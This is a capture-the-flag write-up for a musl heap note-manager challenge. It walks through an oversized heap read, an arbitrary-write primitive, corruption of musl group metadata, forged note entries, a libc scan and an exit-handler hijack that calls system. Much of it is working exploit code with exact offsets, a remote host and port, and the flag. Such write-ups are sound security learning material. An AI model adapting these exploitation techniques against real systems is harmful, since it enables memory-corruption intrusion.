# atypical-heap-revenge writeup

## Summary

The binary is a small note manager compiled against musl and served remotely through `socat`.
It exposes six operations:

1. allocate a note
2. free a note
3. write into a note
4. read from a note
5. a one-shot arbitrary aligned 8-byte write (`magic`)
6. exit

The intended solution is to combine:

- a heap metadata leak from oversized reads
- the one-shot `magic` write
- musl malloc group metadata corruption
- a forged `struct note` entry for arbitrary read/write
- an exit-handler overwrite that calls `system("cat flag.txt")`

### 1. Oversized read from heap chunks

The read path only checks that the requested size is at most `MAX_NOTE_SIZE`:

```c
case NOTE_READ:
    idx = get_idx();

    printf("size: ");
    if (scanf("%u", &sz) != 1)
        errx(1, "invalid input");

    if (sz > MAX_NOTE_SIZE) {
        puts("invalid size");
        break;
    }

    if (notes[idx].data == NULL) {
        puts("note not allocated");
        break;
    }
    write(1, notes[idx].data, sz);
    break;
```

There is no check that `sz <= notes[idx].size`. If we allocate a `0x20` chunk and then request `0x100` bytes, we read past the chunk into adjacent musl heap metadata.

### 2. One-shot arbitrary write

The `magic` handler allows writing one `unsigned long` to any aligned address:

```c
case NOTE_MAGIC:
    if(!magic_used)
        magic_used = 1;

    printf("address: ");
    scanf("%p", &ptr);

    if(((unsigned long)ptr & 7) != 0)
        errx(1, "invalid address");

    printf("value: ");
    scanf("%lu", &value);

    *ptr = value;
    break;
```

The `magic_used` variable is set but never enforced, so this is effectively unlimited arbitrary 8-byte write.

## Heap layout and leaks

The exploit first allocates ten notes of size `0x20` and four notes of size `0x70`.

Because musl groups equal-size allocations into shared metadata structures, an oversized read from one allocated note leaks pointers into the corresponding group metadata.

Two leaks matter:

- reading note `5` with size `0x100` leaks a pointer used to derive `meta20`
- reading note `40` with size `0x100` leaks a pointer used to derive `meta70`

In the exploit:

```python
leak20 = read_note(io, 5, 0x100)
meta20 = u64(leak20[0xF0:0xF8]) + 0x28

leak70 = read_note(io, idx70[0], 0x100)
meta70 = u64(leak70[0x80:0x88]) - 0x28
```

Those offsets are specific to how musl lays out the group and meta structures for these sizes.

## Turning the `magic` write into a heap pivot

After leaking both metadata pointers, the exploit frees three `0x20` notes:

```python
free_note(io, idx20[0])
free_note(io, idx20[5])
free_note(io, idx20[6])
```

Then it corrupts the active `0x20` group so new `0x20` allocations are serviced from the `0x70` metadata region:

```python
magic(io, meta20 + 0x10, meta70 - 0x10)
```

That single pointer rewrite causes subsequent `0x20` allocations to alias fields inside the `0x70` group's metadata instead of ordinary chunk storage.

Two allocations are then used as controlled views into metadata:

- `idx20_meta = 30`
- `idx20_stage = 31`

Reading `idx20_meta` leaks the `group70` pointer:

```python
meta70_data = read_note(io, idx20_meta, 0x20)
group70 = u64(meta70_data[0x10:0x18])
notes_base = group70 - 0xF00
```

The `notes` array in the main binary sits at a fixed offset from that heap area in this challenge, so `notes_base` can be recovered directly.

## Forging a note entry for arbitrary read/write

Each note entry is:

```c
struct note {
    char *data;
    size_t size;
};
```

Once we know the base of the global `notes` array, we can forge one of these entries. The exploit repoints another staged metadata view so that a fresh allocation overlaps the low note slots:

```python
stage_data = bytearray(read_note(io, idx20_stage, 0x20))
stage_data[0x10:0x18] = p64(notes_base - 0x10)
write_note(io, idx20_stage, bytes(stage_data))
alloc(io, idx20_window, 0x20)
```

Now `idx20_window` acts like a writable window over `notes[6]` and `notes[7]`. The helper below edits forged note entries in that window:

```python
def overwrite_low_note(io, notes_base, window_idx, target_idx, data_ptr, size):
    window_base_idx = 6
    window = bytearray(read_note(io, window_idx, 0x20))
    offset = (target_idx - window_base_idx) * 16
    window[offset:offset + 16] = p64(data_ptr) + p64(size)
    write_note(io, window_idx, bytes(window))
```

By forging `notes[6]` as `(target_address, size)`, the normal note read/write menu options become arbitrary memory access primitives:

```python
def arb_read(io, notes_base, window_idx, arb_idx, addr, size):
    overwrite_low_note(io, notes_base, window_idx, arb_idx, addr, size)
    return read_note(io, arb_idx, size)

def arb_write(io, notes_base, window_idx, arb_idx, addr, data):
    overwrite_low_note(io, notes_base, window_idx, arb_idx, addr, len(data))
    write_note(io, arb_idx, data)
```

At this point the challenge is solved in practice: we have stable arbitrary read/write.

## Remote issue: libc was not at a fixed offset

The original local exploit assumed:

```python
libc_base = group70 + 0xE0
```

That was true locally and inside the provided Docker container, but it failed on the real remote service. The remote musl layout placed libc at a different mapping offset relative to the leaked heap metadata.

The fix was to stop assuming a constant relationship and instead locate libc dynamically.

The working version scans pages around `group70`, looks for ELF headers, and validates candidates by checking the first instructions of musl `exit()` at offset `0x356`:

```python
group70_page = group70 & ~0xFFF
libc_base = None
for off in range(-0x10000, 0x20000, 0x1000):
    addr = group70_page + off
    hdr = arb_read(io, notes_base, idx20_window, idx_arb, addr, 4)
    if hdr[:4] == b"\x7fELF":
        code = arb_read(io, notes_base, idx20_window, idx_arb, addr + 0x356, 4)
        if code[:3] == b"\x53\x89\xfb":
            libc_base = addr
            break
```

Why this works:

- `0x356` is the offset of musl `exit` in the provided libc
- its first bytes are `53 89 fb ...` (`push rbx; mov ebx, edi`)
- that signature is enough to distinguish libc from nearby ELF mappings

## Exit-handler hijack

With `libc_base` recovered, the exploit targets musl's exit-function list.

Relevant addresses are:

- `exit_head = libc_base + 0xA5DC8`
- `exit_slot = libc_base + 0xA5FE4`
- `system = libc_base + libc.sym["system"]`

The exploit writes a fake exit-function frame into writable memory near the notes array:

```python
fake = notes_base + 0x520
cmd = notes_base + 0x740

arb_write(io, notes_base, idx20_window, idx_arb, cmd, b"cat flag.txt\x00")
arb_write(io, notes_base, idx20_window, idx_arb, fake, p64(0) + p64(system))
arb_write(io, notes_base, idx20_window, idx_arb, fake + 0x108, p64(cmd))
```

This matches the structure consumed by musl's `__funcs_on_exit`, so when `exit()` walks the list it eventually performs a call equivalent to:

```c
system("cat flag.txt");
```

Finally, the exploit patches the exit list head and slot counter:

```python
magic(io, exit_head, fake)
lock_and_slot = exit_slot - 4
magic(io, lock_and_slot, 1 << 32)
do_exit(io)
```

The second write covers both the exit lock and slot value in one aligned 8-byte store:

- low 32 bits: `lock = 0`
- high 32 bits: `slot = 1`

When menu option `6` calls `exit(0)`, musl processes the forged exit record and prints the flag.

## Why the earlier remote version broke

There were two separate pitfalls during development:

1. The exploit originally depended on a fixed `group70 -> libc` offset that only held locally.
2. A raw final `send()` also proved fragile because it mixed menu input and binary payload in one shot.

The stable final version avoids both issues:

- libc is found dynamically by scanning for the correct ELF mapping
- the final critical writes use `magic()` and prompt-synchronized helpers instead of blasting mixed binary/text input

## Running the solve

Local:

```bash
cd dist
python3 exploit.py
```

Remote:

```bash
cd dist
HOST=34.40.42.244 PORT=31957 python3 exploit.py REMOTE
```

## Flag

```text
CTF{Y34h_th1s_1s_th3_actu4l_fl4g_n0w_my_b4d_0e13b023f341b48d}
```